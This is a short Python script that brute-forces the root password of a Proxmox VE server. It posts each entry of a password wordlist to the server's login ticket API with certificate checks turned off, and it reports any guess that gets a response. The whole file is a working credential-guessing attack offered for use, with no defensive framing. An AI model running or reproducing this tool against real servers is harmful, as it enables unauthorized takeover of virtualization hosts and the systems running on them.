import requests, argparse
from datetime import datetime

def main(host, filepath, verbose):
    print('Start Attack')
    x = False
    with open(filepath) as fp:
        line = fp.readline()
        cnt = 1
        while line:
            line = fp.readline()
            cnt += 1
            try:
                if verbose == True:
                    print("[" + str(datetime.now().strftime("%H:%M:%S")) + "] " + "try : " + line.strip())
                payload = "username=root&password=" + line.strip() + "&realm=pam&new-format=1"
                target = "https://" + host + ":8006/api2/extjs/access/ticket"
                requests.packages.urllib3.disable_warnings()
                out = requests.post(target, data=payload, verify=False, stream=True, timeout=1)
                if out.text:
                    print('Password is : ' + str(line))
                    x = True
            except:
                pass
            if x is True:
                break

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--target","-t", help="Proxmox VE target", required=True)
    parser.add_argument("--Password","-P", help="Password file", required=True)
    parser.add_argument("--verbose", help="Verbose mode", action="store_true")
    args = parser.parse_args()
    host = args.target
    filepath = args.Password
    verbose = args.verbose

    main(host, filepath, verbose)